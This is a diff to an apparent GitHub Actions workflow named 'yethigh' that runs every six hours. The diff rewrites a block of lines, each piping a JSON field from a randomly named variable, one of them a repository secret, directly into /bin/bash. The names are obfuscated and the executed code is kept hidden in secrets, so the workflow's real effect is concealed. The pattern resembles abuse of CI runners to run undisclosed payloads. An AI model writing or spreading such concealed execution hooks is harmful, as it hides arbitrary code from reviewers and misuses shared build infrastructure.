@@ -2,19 +2,29 @@ name: yethigh
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 5/6 * * *'
+    - cron: '10 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yethigh
         env:
-          vupo49: ${{ secrets.vupo49 }}
+          ck7: ${{ secrets.ck7 }}
         run: |
-          echo $vupo49 | jq -r .icvaw09 | /bin/bash
-          echo $af8 | jq -r .jxqzx5256 | /bin/bash
-          echo $hvsn620 | jq -r .hp8 | /bin/bash
-          echo $q43 | jq -r .us9694 | /bin/bash
-          echo $dhxs926 | jq -r .xtdu68490 | /bin/bash
+          echo $ck7 | jq -r .m20 | /bin/bash
+          echo $gnzia474 | jq -r .idfv5 | /bin/bash
+          echo $evzws83791 | jq -r .qrqc170 | /bin/bash
+          echo $brkw1 | jq -r .jc94 | /bin/bash
+          echo $a90 | jq -r .fpv1048 | /bin/bash
+          echo $ov8 | jq -r .a36 | /bin/bash
+          echo $tiy612 | jq -r .nqh8 | /bin/bash
+          echo $vw761 | jq -r .fyi59165 | /bin/bash
+          echo $nvxcw85536 | jq -r .c6549 | /bin/bash
+          echo $lu6 | jq -r .vyp5 | /bin/bash
+          echo $pbcf3 | jq -r .tu488 | /bin/bash
+          echo $jd6777 | jq -r .my7122 | /bin/bash
+          echo $ose79 | jq -r .c20926 | /bin/bash
+          echo $ijob65 | jq -r .y540 | /bin/bash
 
